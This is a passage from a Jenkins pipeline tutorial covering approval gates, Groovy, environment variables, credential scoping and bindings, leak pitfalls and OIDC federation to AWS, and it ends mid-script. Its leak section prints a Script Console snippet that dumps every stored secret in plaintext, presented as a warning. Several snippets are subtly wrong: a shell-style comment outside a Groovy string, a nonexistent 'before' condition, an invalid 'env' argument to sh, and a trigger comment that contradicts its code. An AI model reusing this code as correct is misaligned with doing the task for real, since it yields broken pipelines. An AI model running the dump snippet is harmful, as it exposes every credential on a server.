    ☐ the staging smoke test passed
    ☐ the diff touches only the expected paths
    ☐ a change ticket is linked in the commit message
    ☐ it is NOT Friday after 16:00 IST
    ☐ no SLO is burning (check the Grafana dashboard)
  ─────────────────────────────────────────────
""".stripIndent(),
                ok: '✅ Approve and deploy to production',
                submitter: approvers.join(','),       // ⭐⭐ WHO may approve
                submitterParameter: 'APPROVER',       // ⭐ the approver's ID is captured
                canCancel: true                        // ⭐ others may cancel while waiting
              echo "  approved by ${env.APPROVER}"
              currentBuild.description += "\n✅ approved by ${env.APPROVER}"
            } catch (org.jenkinsci.plugins.workflow.steps.FlowInterruptedException e) {
              // ⭐⭐ a TIMEOUT or a CANCEL lands here — handle it explicitly
              echo "⛔ the approval was not granted: ${e.message}"
              currentBuild.result = 'ABORTED'
              currentBuild.description += "\n⛔ approval timed out or was rejected"
              notifySlack('⛔ production approval timed out or was rejected', 'warning')
              error('the production deploy was not approved')   // ⭐ fail the build
            }
          }
        }

        // ⭐⭐ 2. THE MUTEX — a real lock, as a STEP wrapping the deploy
        lock(resource: 'deploy-production', label: 'the production deploy mutex',
             extra: [[resource: 'shop-database-migrations']],
             inversePrecedence: true) {
          script { deployTo('production') }
        }
      }
      post {
        success {
          script {
            // ⭐ move the "what is in production" tag
            withCredentials([usernamePassword(credentialsId: 'github-bot',
                                              usernameVariable: 'GIT_USER',
                                              passwordVariable: 'GIT_TOKEN')]) {
              sh '''
                set -euo pipefail
                git config user.name  "$GIT_USER"
                git config user.email "shop-ci@shop.example.com"
                git remote set-url origin "https://${GIT_USER}:${GIT_TOKEN}@github.com/3558Bhk/shop.git"
                git tag -f "prod-$(date -u +%F)" "$GIT_SHA_FULL"
                git push -f origin "prod-$(date -u +%F)"
                git push origin "refs/tags/deployed/${GIT_SHA_FULL}" --force || true
              '''
            }
            notifySlack("🚀 production is at ${env.GIT_SHA_FULL.take(7)}", 'good')
          }
        }
        failure { notifySlack("⛔ the production deploy FAILED — ${env.BUILD_URL}", 'danger') }
      }
    }
  }

  // ── the global post section ───────────────────────────────────
  post {
    always {
      script {
        // ⭐ record the DORA metrics
        def durationMin = (currentBuild.duration / 60000).round(1)
        echo """
        ═══════════════════════════════════════════════
          build      : #${env.BUILD_NUMBER} ${currentBuild.displayName}
          result     : ${currentBuild.currentResult}
          duration   : ${durationMin} min
          revision   : ${env.GIT_SHA_FULL?.take(7)}
          branch     : ${env.GIT_BRANCH}
          approver   : ${env.APPROVER ?: 'n/a'}
          agents     : ${env.NODE_NAME}
        ═══════════════════════════════════════════════
        """
        // ⭐ push the metrics to Prometheus via the Pushgateway
        withEnv(["PUSHGW=http://kps-kube-prometheus-stack-prometheus-pushgateway.monitoring:9091"]) {
          sh '''
            set -uo pipefail
            cat > /tmp/metrics.prom <<EOF
            # TYPE jenkins_build_duration_seconds gauge
            # HELP jenkins_build_duration_seconds how long the build took
            jenkins_build_duration_seconds{job="${JOB_NAME}",result="${BUILD_RESULT}",branch="${GIT_BRANCH:-unknown}"} ${DURATION}
            # TYPE jenkins_build_total counter
            jenkins_build_total{job="${JOB_NAME}",result="${BUILD_RESULT}",branch="${GIT_BRANCH:-unknown}"} 1
            EOF
            sed -i "s/\${DURATION}/${DURATION_SECONDS}/" /tmp/metrics.prom
            curl -sf --data-binary @/tmp/metrics.prom "$PUSHGW/metrics/job/${JOB_NAME}/build/${BUILD_NUMBER}" \
              || echo "  ⚠️  could not reach the Pushgateway"
          '''
        }
      }
      // ⭐ clean the workspace on a dynamic agent (the pod dies anyway, but
      //    on a persistent agent this is essential)
      cleanWs(deleteDirs: true, notFailBuild: true,
              patterns: [[pattern: '.git', type: 'INCLUDE']])
    }
    success  { script { notifySlack("✅ ${env.JOB_NAME} #${env.BUILD_NUMBER} succeeded in ${(currentBuild.duration/60000).round(1)} min", 'good') } }
    unstable { script { notifySlack("⚠️ ${env.JOB_NAME} #${env.BUILD_NUMBER} is UNSTABLE (tests failed but the build continued)", 'warning') } }
    failure  { script { notifySlack("⛔ ${env.JOB_NAME} #${env.BUILD_NUMBER} FAILED — ${env.BUILD_URL}console", 'danger') } }
    aborted  { script { notifySlack("🚫 ${env.JOB_NAME} #${env.BUILD_NUMBER} was aborted", '#808080') } }
    changed  { script { notifySlack("🔀 ${env.JOB_NAME} is now ${currentBuild.currentResult} (was ${currentBuild.previousBuild?.result})", 'warning') } }
    cleanup  { echo 'the pipeline is complete' }      // ⭐ runs even if the build was aborted
  }
}

// ── helper functions at the bottom of the Jenkinsfile ───────────
// ⭐ in a real setup these live in the SHARED LIBRARY (§6), not here.
def notifySlack(String text, String color) {
  try {
    def payload = groovy.json.JsonOutput.toJson([
      attachments: [[
        color: color, title: text, title_link: env.BUILD_URL,
        fields: [
          [title: 'Branch',   value: env.GIT_BRANCH ?: '?', short: true],
          [title: 'Revision', value: (env.GIT_SHA_FULL ?: '?').take(7), short: true],
          [title: 'Duration', value: "${(currentBuild.duration/60000).round(1)} min", short: true],
          [title: 'Trigger',  value: currentBuild.getBuildCauses('TimerTriggerCause,SCMTriggerCause,UserIdCause')*.shortDescription.join(', ') ?: 'unknown', short: true],
        ]
      ]]
    ])
    sh "curl -sf -XPOST -H 'Content-Type: application/json' -d '${payload}' \"\$SLACK_WEBHOOK\""
  } catch (e) {
    echo "⚠️  the Slack notification failed: ${e.message}"   // ⭐ never fail a build over a notification
  }
}

def deployTo(String env) {
  // ⭐ the deploy logic. In production this is a shared-library step: `deployTo(env)`
  sh """
    set -euo pipefail
    ENV=$env ./scripts/deploy.sh \$ENV "${env.GIT_SHA_FULL}"
  """
}
```

### 1.2 Declarative vs scripted ⭐

```groovy
// ═══════════ DECLARATIVE ═══════════  (99% of what you should write)
pipeline {
  agent any
  stages {
    stage('Build') { steps { sh 'make' } }
  }
  post { always { echo 'done' } }
}
// ✅ a fixed, readable structure
// ✅ `post` blocks, `when` conditions, `environment`, `options` — declarative only
// ✅ validated at parse time (a typo is a clear error before the build starts)
// ✅ the Blue Ocean editor can render and edit it
// ⛔ less flexible for genuinely dynamic logic

// ═══════════ SCRIPTED ═══════════  (the escape hatch)
node('linux') {
  stage('Build') {
    checkout scm
    try {
      sh 'make'
    } catch (e) {
      currentBuild.result = 'UNSTABLE'
      mail to: 'team@x.com', subject: 'build failed', body: e.message
    } finally {
      junit 'test-results/*.xml'
    }
  }
}
// ✅ full Groovy — loops, closures, recursion, anything
// ⛔ no `post`, no `when`, no `options`
// ⛔ errors surface at RUNTIME, deep in the build
// ⛔ much harder to read in review

// ⭐⭐ THE ANSWER: write DECLARATIVE, and drop into `script { … }` blocks
//    for the parts that need Groovy. That's what the example above does.
pipeline {
  agent any
  stages {
    stage('Dynamic') {
      steps {
        script {
          def services = readFile('services.txt').readLines()
          def branches = [:]
          services.each { svc ->
            branches["test-${svc}"] = { node('linux') { sh "./test.sh ${svc}" } }
          }
          parallel branches
        }
      }
    }
  }
}
```

### 1.3 The Groovy you actually need

```groovy
// ── strings ─────────────────────────────────────────────────────
def a = 'single quotes: NO interpolation ${env.X}'      // ⭐ Groovy java.lang.String
def b = "double quotes: interpolation ${env.BUILD_NUMBER}"  // ⭐ GString
def c = """triple double: multi-line ${env.X}"""
def d = '''triple single: multi-line, no interpolation'''
// ⭐⭐ THE #1 JENKINS BUG SOURCE: using 'single quotes' in a `sh` step and
//    wondering why ${env.X} came out literal. In a `sh '…'` step, Groovy does NOT
//    interpolate — the SHELL does, and the shell doesn't know Groovy's env.

sh 'echo $BUILD_NUMBER'          // ✅ the SHELL expands $BUILD_NUMBER (it's in env)
sh "echo ${env.BUILD_NUMBER}"    // ⚠️ Groovy interpolates FIRST → the value is
                                 //    inlined into the script text. ⛔ If that value
                                 //    came from a PR title, that's an INJECTION.
sh 'echo "$MY_VAR"'              // ⭐⭐ THE SAFE PATTERN
// with env: [MY_VAR: "${someUntrustedValue}"]

// ⭐⭐ THE RULE: use SINGLE QUOTES in `sh` steps, and pass values via `withEnv`.
//    Use double quotes only for values you control (constants, env.GIT_COMMIT).

// ── the sh step's four modes ────────────────────────────────────
sh 'make'                                     // fails the step on a non-zero exit
def out = sh(returnStdout: true, script: 'git rev-parse HEAD').trim()
sh(returnStatus: true, script: 'grep x f')    // ⭐ returns the EXIT CODE, doesn't fail
//    → 0 or non-zero; use `if (rc != 0) { … }`
sh(returnStdout: true, script: 'echo hi').trim()   // ⭐ .trim() — the output has a \n

// ── collections ─────────────────────────────────────────────────
def list = ['a', 'b', 'c']
def map  = [name: 'shop-api', port: 8080, tags: ['v1', 'latest']]
map.each { k, v -> echo "$k = $v" }
list.collect { it.toUpperCase() }             // ['A','B','C']
list.findAll { it.startsWith('a') }
list.join(', ')
map.keySet(); map.values()
// ⭐⭐ building a parallel map (the matrix equivalent)
def branches = [:]
['a', 'b', 'c'].each { svc ->
  branches["test-${svc}"] = { node { sh "./test.sh ${svc}" } }   // ⭐ the closure captures svc
}
parallel branches
// ⛔ THE CLASSIC CLOSURE BUG: in a `for` loop the variable is shared, so all
//    closures see the LAST value. Use `.each {}` or capture explicitly:
for (int i = 0; i < 3; i++) {
  def idx = i                                  // ⭐⭐ capture into a new local
  branches["job-$i"] = { echo "I am $idx" }
}

// ── JSON ────────────────────────────────────────────────────────
import groovy.json.JsonSlurper
import groovy.json.JsonOutput
def parsed = new JsonSlurper().parseText(readFile('build-info.json'))
// ⭐⭐ the JsonSlurper is NOT serializable — Jenkins checkpoints the CPS state
//    between steps and a non-serializable object BREAKS the build with
//    "java.io.NotSerializableException: groovy.json.internal.LazyMap"
//    FIX: scope it inside a @NonCPS method, or convert it:
@NonCPS
def parseJson(String text) { new groovy.json.JsonSlurper().parseText(text) }
def asMap = parseJson(readFile('x.json'))      // ✅ safe
def json  = JsonOutput.toJson([a: 1, b: [2, 3]])
def pretty = JsonOutput.prettyPrint(json)
writeFile file: 'out.json', text: pretty

// ── conditionals and the `when` directive ───────────────────────
stage('X') {
  when {
    branch 'main'                              // a specific branch
    branch pattern: 'release/*', comparator: 'GLOB'
    tag 'v*'
    changeRequest()                            // ⭐⭐ it IS a pull request
    changeRequest(target: 'main')
    buildingTag()
    environment name: 'DEPLOY_TO', value: 'true'
    expression { params.ENVIRONMENT == 'production' && currentBuild.result == null }
    equals expected: 'x', actual: env.FOO
    allOf { branch 'main'; not { changeRequest() } }
    anyOf { branch 'main'; branch 'develop' }
    not { expression { params.SKIP_TESTS } }
    triggeredBy 'SCMTrigger'                   // ⭐ only a cron trigger
    triggeredBy 'UserIdCause'                  // ⭐ only a manual run
    before 'Deploy'                            // ⭐ evaluate the when BEFORE the agent
                                               //    is allocated — saves a pod!
  }
  agent { label 'expensive' }                  // ⭐ `before 'X'` avoids starting this
  steps { echo 'running' }
}
// ⭐⭐ `when { beforeAgent true }` is the single biggest agent-cost saver in Jenkins.

// ── error handling ──────────────────────────────────────────────
try {
  sh 'make'
} catch (Exception e) {
  echo "caught: ${e.message}"
  currentBuild.result = 'UNSTABLE'             // ⭐ don't fail, but mark it
  // ⛔ currentBuild.result = 'FAILURE' does NOT stop the build. Use error() to stop:
  error('stopping the build deliberately')     // ⭐ throws, fails the stage
}
// ⭐ the retry with backoff
retry(3) { sh './flaky-integration-test.sh' }  // ⛔ no backoff, retries immediately
// ✅ with backoff:
for (int attempt = 1; attempt <= 3; attempt++) {
  def rc = sh(returnStatus: true, script: './flaky-test.sh')
  if (rc == 0) break
  echo "attempt $attempt failed (rc=$rc) — sleeping ${attempt * 30}s"
  sleep(time: attempt * 30, unit: 'SECONDS')
  if (attempt == 3) { error('the test failed 3 times') }
}
// ⭐ catchError — keep going but mark the build
catchError(buildResult: 'SUCCESS', stageResult: 'UNSTABLE', message: 'the E2E suite flaked') {
  sh './e2e.sh'
}
// ⭐ unstash/stash across stages
stash name: 'artifacts', includes: 'dist/**', excludes: '**/*.map', useDefaultExcludes: true
unstash 'artifacts'
// ⭐ timeout as a step
timeout(time: 10, unit: 'MINUTES') { sh './long-thing.sh' }
// ⭐ waitUntil with a deadline
waitUntil(initialRecurrencePeriod: 5, quiet: true) {
  def ok = sh(returnStatus: true, script: 'curl -sf http://localhost:8080/health') == 0
  return ok
}
```

### 1.4 The environment variables you must know ⭐

```
BUILD
  env.BUILD_NUMBER       47
  env.BUILD_ID           47
  env.BUILD_DISPLAY_NAME #47
  env.BUILD_URL          https://jenkins.shop.example.com/job/shop/job/main/47/
  env.JOB_NAME           shop/main                   ⭐ folder/job
  env.JOB_URL            https://jenkins…/job/shop/job/main/
  env.JOB_BASE_NAME      main
  env.EXECUTOR_NUMBER    0
  env.NODE_NAME          shop-47-abcde               ⭐ the agent/pod
  env.NODE_LABELS        shop-47-abcde built-in linux
  env.WORKSPACE          /home/jenkins/agent/workspace/shop_main
  env.JENKINS_HOME       /var/jenkins_home
  env.JENKINS_URL        https://jenkins.shop.example.com/
  env.BUILD_TAG           jenkins-shop-main-47       ⭐ great for image tags

GIT (set by the Git plugin)
  env.GIT_COMMIT         a1b2c3d4…                   ⭐ the full SHA
  env.GIT_BRANCH         origin/main
  env.GIT_PREVIOUS_COMMIT / GIT_PREVIOUS_SUCCESSFUL_COMMIT
  env.GIT_URL            https://github.com/3558Bhk/shop
  env.GIT_AUTHOR_NAME / GIT_AUTHOR_EMAIL / GIT_COMMITTER_NAME
  env.GIT_LOCAL_BRANCH / GIT_CHECKOUT_DIR

CHANGE REQUEST (the Multibranch/GitHub Branch Source plugin)
  env.CHANGE_ID          42                          ⭐ the PR number
  env.CHANGE_TARGET      main
  env.CHANGE_BRANCH      feature/x
  env.CHANGE_URL         https://github.com/3558Bhk/shop/pull/42
  env.CHANGE_TITLE       ⛔⛔ UNTRUSTED — never interpolate into a shell
  env.CHANGE_AUTHOR      ⛔ UNTRUSTED
  env.CHANGE_FORK        ATTACKER/shop               ⭐ present if it's a fork

CREDENTIALS (from `credentials('id')`)
  env.MY_CREDS           the whole value
  env.MY_CREDS_USR       the username
  env.MY_CREDS_PSW       the password
  ⭐ all masked as **** in every log line

PARAMETERS
  params.ENVIRONMENT     'production'                ⭐ the typed accessor
  env.ENVIRONMENT        'production'                ⭐ also set as an env var
  ⚠️ params.X is null-safe; env.X is an empty string when unset

currentBuild (the object, not env)
  currentBuild.result / .currentResult   'SUCCESS' | 'FAILURE' | 'UNSTABLE' | 'ABORTED'
  currentBuild.displayName  = '#47 · main · a1b2c3d'  ⭐ writable
  currentBuild.description  = '…'                     ⭐ writable
  currentBuild.duration / .durationString
  currentBuild.number / .id / .absoluteUrl
  currentBuild.startTimeInMillis
  currentBuild.previousBuild?.result
  currentBuild.getBuildCauses()          ⭐ WHY this build ran — a list of maps
  currentBuild.getBuildCauses('UserIdCause')
  currentBuild.changeSets                ⭐ the commits in this build
  currentBuild.rawBuild                  ⛔ requires script approval

env vs params vs currentBuild — the precedence:
  params.X (typed, from the build)  >  environment {} (the Jenkinsfile)
  >  withEnv (the step)  >  the agent's environment  >  the controller's
```

```groovy
// ⭐ dump everything, once, and read it
stage('Debug context') {
  steps {
    script {
      echo "=== env ==="
      env.getEnvironment().findAll { k, v -> !v?.contains('secret') }
         .sort().each { k, v -> echo "  ${k}=${v}" }
      echo "=== params ==="
      params.each { k, v -> echo "  ${k}=${v}" }
      echo "=== currentBuild ==="
      echo "  result=${currentBuild.currentResult} number=${currentBuild.number}"
      echo "  causes=${currentBuild.getBuildCauses()}"
      echo "  changeSets=${currentBuild.changeSets*.items*.commitId}"
      echo "=== the agent ==="
      sh 'uname -a; id; pwd; df -h .; free -h; nproc; cat /etc/os-release | head -2'
    }
  }
}
```

---

## 2 · Credentials ⭐

### 2.1 The types and the scopes

```
TYPES
  Username with password      → the classic. Gives _USR and _PSW.
  SSH Username with private key → git over SSH, or a deploy target
  Secret text                 → ⭐ a single opaque string (an API token)
  Secret file                 → ⭐⭐ a FILE (a kubeconfig, a service-account JSON,
                                a TLS cert). Mounted at a temp path, deleted after.
  Certificate                 → a PKCS#12 with a password
  ⭐ Docker Host Registry Authentication Data → a registry login
  ⭐ Amazon Web Services credentials            → from the aws-credentials plugin
  ⭐ Azure credentials                          → from azure-credentials
  ⭐ Vault credentials                          → from hashicorp-vault-plugin
  ⭐ OpenID Connect token                       → from oidc-provider (§4.6)

SCOPES ⭐⭐ — the thing that makes credentials safe
  System   → available to Jenkins ITSELF (e.g. connecting an agent, a cloud),
             NOT to pipelines
  Global   → available to EVERY job. ⛔ The default, and the wrong default.
  ⭐ Folder → available only to jobs INSIDE that folder. THE ONE TO USE.
  Job      → available only to one job
```

```
THE FOLDER LAYOUT ⭐⭐ — this is how you scope credentials properly

Manage Jenkins → Credentials → System → Global credentials (unrestricted)
                                        ⛔ put almost nothing here

Folders:
  📁 platform/                       ← the platform team's folder
     📁 credentials (folder-scoped)
        · github-app-installation     (GitHub App private key)
        · harbor-robot-account
        · vault-approle-platform
     📁 jobs
        · pipeline-templates
        · infra
  📁 shop/
     📁 credentials (folder-scoped)
        · ghcr-token                  ← ⭐ only jobs in shop/ can use this
        · kubeconfig-dev
        · kubeconfig-staging
        · slack-webhook
     📁 jobs
        · shop-main                   (a Pipeline job)
        · shop-PRs                    (a Multibranch Pipeline)
     📁 📁 production/                ← ⭐⭐ a NESTED folder
        📁 credentials
           · kubeconfig-production    ← ⭐⭐ ONLY jobs in shop/production/ can read it
           · aws-prod-oidc-role
           · pagerduty-key
        📁 jobs
           · shop-production-deploy
```

```groovy
// ⭐⭐ the mechanism: a job in shop/ CANNOT reference kubeconfig-production.
//    It fails with "No such credential" — not a permission error, it simply
//    doesn't exist in that scope. That's the point.
```

### 2.2 Creating credentials

```bash
# ⭐ via the Script Console (Manage Jenkins → Script Console) — the fastest way
```

```groovy
import jenkins.model.Jenkins
import com.cloudbees.plugins.credentials.CredentialsScope
import com.cloudbees.plugins.credentials.domains.Domain
import com.cloudbees.plugins.credentials.impl.*
import org.jenkinsci.plugins.plaincredentials.impl.*

def store = Jenkins.instance
  .getItemByFullName('shop')                        // ⭐⭐ a FOLDER scope
  .getProperty(com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProperty)
  .getCredentialsStore()

// a Secret text
store.addCredentials(Domain.global(),
  new StringCredentialsImpl(CredentialsScope.GLOBAL, 'ghcr-token',
    'GHCR push token (packages:write)',
    hudson.util.Secret.fromString('ghp_xxxxxxxxxxxxxxxxxxxx')))

// a Secret FILE — a kubeconfig
store.addCredentials(Domain.global(),
  new FileCredentialsImpl(CredentialsScope.GLOBAL, 'kubeconfig-staging',
    'The staging cluster kubeconfig',
    'kubeconfig-staging.yaml',
    SecretBytes.fromBytes(new File('/tmp/kubeconfig-staging.yaml').bytes)))

// Username with password
store.addCredentials(Domain.global(),
  new UsernamePasswordCredentialsImpl(CredentialsScope.GLOBAL, 'github-bot',
    'The bot that pushes tags', 'shop-ci-bot', 'ghp_yyyyyyyyyyyy'))

// SSH private key
store.addCredentials(Domain.global(),
  new BasicSSHUserPrivateKey(CredentialsScope.GLOBAL, 'deploy-ssh', 'deploy',
    new BasicSSHUserPrivateKey.DirectEntryPrivateKeySource(
      new File('/home/harish/.ssh/id_ed25519').text),
    '', 'the deploy key'))

// ⭐ a DOMAIN-scoped credential — only offered for matching hosts
import com.cloudbees.plugins.credentials.domains.HostnameSpecification
def registryDomain = new Domain('ghcr', 'Credentials for ghcr.io',
  [new HostnameSpecification('ghcr.io', null)])
store.addDomain(registryDomain)
store.addCredentials(registryDomain,
  new UsernamePasswordCredentialsImpl(CredentialsScope.GLOBAL, 'ghcr-user',
    'ghcr.io login', '3558bhk', 'ghp_zzzz'))

println "  ✅ ${store.credentials.size()} credentials in the shop folder"
store.credentials.each { println "     ${it.id}  (${it.getClass().simpleName})  ${it.description}" }
```

```bash
# ⭐ via the Jenkins CLI (safer — no Groovy approval needed)
java -jar jenkins-cli.jar -s https://jenkins.shop.example.com/ -auth admin:TOKEN \
  create-credentials-by-xml system::system::global::unrestricted <<'XML'
<com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
  <scope>GLOBAL</scope>
  <id>ghcr-token</id>
  <description>GHCR push token</description>
  <username>3558bhk</username>
  <password>ghp_xxxx</password>
</com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
XML

# ⭐ via jenkins-cli over SSH (enable in Security → Agents → SSH)
ssh -p 50000 admin@jenkins.shop.example.com list-jobs shop
ssh -p 50000 admin@jenkins.shop.example.com get-job shop/main > config.xml
ssh -p 50000 admin@jenkins.shop.example.com reload-job shop/main
ssh -p 50000 admin@jenkins.shop.example.com who-am-i
ssh -p 50000 admin@jenkins.shop.example.com console
```

### 2.3 Using credentials ⭐

```groovy
// ── 1. the `environment {}` binding ────────────────────────────
environment {
  // ⭐ Username with password → THREE variables
  GHCR = credentials('ghcr-token')
  //    GHCR       = "3558bhk:ghp_xxxx"   (the whole thing)
  //    GHCR_USR   = "3558bhk"
  //    GHCR_PSW   = "ghp_xxxx"           ⭐ masked as **** in logs

  // ⭐ Secret text → ONE variable
  API_KEY = credentials('api-key')

  // ⭐ Secret FILE → the variable holds the PATH to a temp file
  KUBECONFIG = credentials('kubeconfig-staging')
  //    → /home/jenkins/agent/workspace/…@tmp/secretFiles/xxxx/kubeconfig
  //    ⭐ the file exists for the duration of the build and is deleted after
}

// ── 2. `withCredentials` — scoped to a block ⭐⭐ PREFERRED ──────
steps {
  withCredentials([
    usernamePassword(credentialsId: 'ghcr-token',
                     usernameVariable: 'REG_USER', passwordVariable: 'REG_PASS'),
    string(credentialsId: 'slack-webhook', variable: 'SLACK_URL'),
    file(credentialsId: 'kubeconfig-production', variable: 'KUBECONFIG'),
    sshUserPrivateKey(credentialsId: 'deploy-ssh', keyFileVariable: 'SSH_KEY',
                      usernameVariable: 'SSH_USER', passphraseVariable: 'SSH_PASS'),
    certificate(credentialsId: 'client-cert', keystoreVariable: 'KEYSTORE',
                passwordVariable: 'KEYSTORE_PW', aliasVariable: 'CERT_ALIAS'),
    // ⭐ Vault, from the hashicorp-vault-plugin
    [$class: 'VaultTokenCredentialBinding', credentialsId: 'vault-approle',
     vaultAddr: 'https://vault.shop.example.com'],
  ]) {
    sh '''
      set -euo pipefail
      # ⭐ SINGLE QUOTES — the shell expands, Groovy does not
      echo "$REG_PASS" | docker login ghcr.io -u "$REG_USER" --password-stdin
      kubectl --kubeconfig "$KUBECONFIG" -n shop get deploy
      curl -sf -XPOST "$SLACK_URL" -d '{"text":"deploying"}'
      ssh -i "$SSH_KEY" -o StrictHostKeyChecking=accept-new "$SSH_USER@host" 'uptime'
    '''
    // ⭐ Vault secrets, via the plugin's binding
    withVault(configuration: [vaultUrl: 'https://vault.shop.example.com',
                              vaultCredentialId: 'vault-approle'],
              vaultSecrets: [[path: 'secret/data/shop/staging', secretValues: [
                  [envVar: 'DB_PASSWORD', vaultKey: 'db_password'],
                  [envVar: 'API_SECRET',  vaultKey: 'api_secret']]]]) {
      sh 'psql "$DB_URL" -c "SELECT 1"'        # ⭐ DB_PASSWORD is masked
    }
  }
  // ⭐⭐ outside the block the variables are GONE and the temp files are DELETED
}

// ── 3. the Docker registry binding ─────────────────────────────
docker.withRegistry('https://ghcr.io', 'ghcr-token') {
  def img = docker.build("ghcr.io/3558bhk/shop-api:${env.GIT_COMMIT}", 'apps/shop-api')
  img.push()
  img.push('latest')
}

// ── 4. Kubernetes credentials (the cloud connection) ───────────
// Manage Jenkins → Clouds → kubernetes → Credentials →
//   "Bearer token" from the service account, or a kubeconfig file
```

### 2.4 ⛔ The credential leaks — and how to prevent them

```groovy
// ⛔ LEAK 1: echoing the variable
sh "echo ${env.GHCR_PSW}"          // ⛔⛔ Groovy interpolates it INTO THE SCRIPT TEXT.
                                   //    The script text is stored in the build log's
                                   //    "workflow" record even though the output is masked.
                                   //    And `currentBuild.rawBuild.getLog()` may show it.
sh 'echo "$GHCR_PSW"'              // ✅ masked as **** in the output

// ⛔ LEAK 2: double-quoted strings in Groovy
println "the token is ${env.GHCR_PSW}"      // ⛔ goes to the build log, unmasked
echo env.GHCR_PSW                            // ⛔ same

// ⛔ LEAK 3: `set -x`
sh '''
  set -x                        # ⛔⛔ bash -x PRINTS EVERY COMMAND AFTER EXPANSION
  curl -H "Authorization: Bearer $TOKEN" https://api.example.com
'''

// ⛔ LEAK 4: writing a credential to a file that gets archived
sh 'echo "$GHCR_PSW" > .env'
archiveArtifacts '.env'          // ⛔⛔ now it's in the artifact store, in plaintext

// ⛔ LEAK 5: a non-masked DERIVED value
sh '''
  B64=$(echo "$TOKEN" | base64)   # ⛔ Jenkins masks $TOKEN but NOT its base64 form
  echo "$B64"                     # ⛔ LEAKED
'''
// ✅ FIX: mask it explicitly
sh '''
  B64=$(echo "$TOKEN" | base64)
  # ⭐ you can't add a mask from bash; do it in Groovy:
'''
script {
  def b64 = sh(returnStdout: true, script: 'echo "$TOKEN" | base64', env: [TOKEN: env.GHCR_PSW]).trim()
  // ⭐ there's no public API to add a mask at runtime from a Jenkinsfile.
  //    The real fix: DON'T derive credentials in the pipeline. Do it in the script,
  //    or use a credential that's already in the right form.
}

// ⛔ LEAK 6: the Script Console
// Manage Jenkins → Script Console
println Jenkins.instance.getExtensionList(com.cloudbees.plugins.credentials.CredentialsProvider)
  .flatMap { it.getCredentials(com.cloudbees.plugins.credentials.common.StandardCredentials, Jenkins.instance, null) }
  .findAll { it instanceof org.jenkinsci.plugins.plaincredentials.StringCredentials }
  .collectEntries { [(it.id): it.secret.plainText] }
// ⛔⛔⛔ THAT PRINTS EVERY SECRET IN JENKINS IN PLAINTEXT.
// ⭐ which is why Script Console access == Overall/Administer == you own every secret.
//    Restrict it. Audit it. Never give it to a team that only needs to build.

// ⭐ THE PREVENTION LAYER
// Manage Jenkins → Security →
//   ☑ "Secrets": mask secret values in the build log  (on by default)
//   ☑ Credentials Plugin → "Restrictions on credentials usage"
//   ⭐ the `credentials-binding` plugin masks by DEFAULT in `sh` output
// ⭐ and the audit:
```

```groovy
// ⭐ AUDIT: which jobs reference which credentials?
import com.cloudbees.plugins.credentials.*
import hudson.model.*
def report = [:]
Jenkins.instance.allItems(Job).each { job ->
  if (job instanceof org.jenkinsci.plugins.workflow.job.WorkflowJob) {
    def flow = job.definition
    if (flow instanceof org.jenkinsci.plugins.workflow.cps.CpsScmFlowDefinition) {
      // ⭐ the Jenkinsfile is in SCM — we can't statically see the credential IDs
      report[job.fullName] = 'SCM-based (grep the Jenkinsfile for credentialsId:)'
    } else if (flow instanceof org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition) {
      def script = flow.script
      def ids = (script =~ /credentials(?:Id)?\s*[:(=]\s*['"]([^'"]+)['"]/).collect { it[1] }
      ids += (script =~ /credentials\(['"]([^'"]+)['"]\)/).collect { it[1] }
      report[job.fullName] = ids.unique()
    }
  }
}
report.each { k, v -> println "${k.padRight(50)} ${v}" }
println "\n⭐ now cross-reference with the credential IDs and their folder scopes."
println "  A job referencing a credential OUTSIDE its folder scope will fail at runtime."
```

### 2.5 OIDC — Jenkins with zero stored cloud secrets ⭐⭐

**Two directions, both matter:**

```
A) Jenkins AS an OIDC PROVIDER  (the `oidc-provider` plugin)
   → Jenkins issues signed JWTs about a build
   → AWS/Azure/GCP/Vault trust Jenkins' issuer and exchange the JWT for
     temporary credentials
   → ⭐⭐ NO cloud credential is ever stored in Jenkins

B) Jenkins AS an OIDC CLIENT
   → users log in with Entra ID / Okta / Google instead of Jenkins-local accounts
```

**(A) Jenkins as the provider:**

```
Manage Jenkins → Plugins → install "OpenID Connect Provider" (oidc-provider)
Manage Jenkins → Configure Global Security →
  ⭐ "OpenID Connect Provider" section:
     Client ID:              jenkins-shop
     Client Secret:          <generate>          ⭐ the CONSUMER (AWS) needs this
     Signature algorithm:    RS256
     ⭐ Token expiry:        3600 seconds
     Public key:             (generated)
  → the issuer URL is: https://jenkins.shop.example.com/oidc/
  → the discovery doc: https://jenkins.shop.example.com/oidc/.well-known/openid-configuration
  → the JWKS:          https://jenkins.shop.example.com/oidc/jwks
```

```groovy
// ⭐ in the Jenkinsfile
pipeline {
  agent any
  stages {
    stage('Federate to AWS') {
      steps {
        // ⭐ 1. get a Jenkins-signed OIDC token
        script {
          def token = sh(returnStdout: true, script: '''
            curl -sf -u "$OIDC_CLIENT_ID:$OIDC_CLIENT_SECRET" \
              "$JENKINS_URL/oidc/token?audience=sts.amazonaws.com&scope=openid" \
              -d "grant_type=client_credentials" | jq -r .id_token
          ''', env: [OIDC_CLIENT_ID: 'jenkins-shop',
                     OIDC_CLIENT_SECRET: env.OIDC_CLIENT_SECRET]).trim()

          // ⭐⭐ the claims Jenkins puts in the token — THIS IS THE SECURITY BOUNDARY
          def payload = token.split('\\.')[1]
          def json = new String(payload.decodeBase64())
          echo json      // the claims are NOT secret
          // {
          //   "iss": "https://jenkins.shop.example.com/oidc",
          //   "aud": "sts.amazonaws.com",
          //   "sub": "shop/main",                    ← ⭐⭐ the JOB NAME
          //   "jenkins_job_name": "shop/main",
          //   "jenkins_build_number": 47,
          //   "jenkins_build_url": "https://…/47/",
          //   "jenkins_scm_uri": "https://github.com/3558Bhk/shop",
          //   "jenkins_scm_ref": "refs/heads/main",  ← ⭐⭐ THE BRANCH
          //   "jenkins_scm_commit": "a1b2c3d4…",
          //   "exp": 1757499999
          // }
          def claims = new groovy.json.JsonSlurper().parseText(json)
          if (claims.jenkins_scm_ref != 'refs/heads/main') {
            error("refusing to federate for ${claims.jenkins_scm_ref} — only main may deploy")
          }
          writeFile file: '.oidc-token', text: token
        }

        // ⭐ 2. exchange it for temporary AWS credentials
        withEnv(['AWS_WEB_IDENTITY_TOKEN_FILE=.oidc-token']) {
          sh '''
            set -euo pipefail
            export AWS_ROLE_ARN="arn:aws:iam::123456789012:role/jenkins-prod-deployer"
